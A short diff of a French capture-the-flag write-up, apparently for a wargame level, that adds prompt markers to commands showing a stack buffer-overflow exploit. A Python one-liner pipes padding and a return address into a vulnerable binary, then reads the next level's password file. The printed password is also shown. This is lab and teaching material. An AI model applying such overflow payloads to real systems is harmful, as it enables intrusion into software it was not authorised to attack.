@@ -136,9 +136,9 @@ Good... Wait what?
 
 On se rend compte que nous ne restons pas dans le shell une fois le programme fini, donc on utlise la commande **cat** pour laisser ouvert ce dernier :
 
-<pre><code>(python -c "print '/x90' * 76 + '\x44\x84\x04\x08'"; cat) | ./level1
+<pre><code>> (python -c "print '/x90' * 76 + '\x44\x84\x04\x08'"; cat) | ./level1
 Good... Wait what?
-cd ../level2 && cat .pass
+> cd ../level2 && cat .pass
 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
 </code></pre>
 
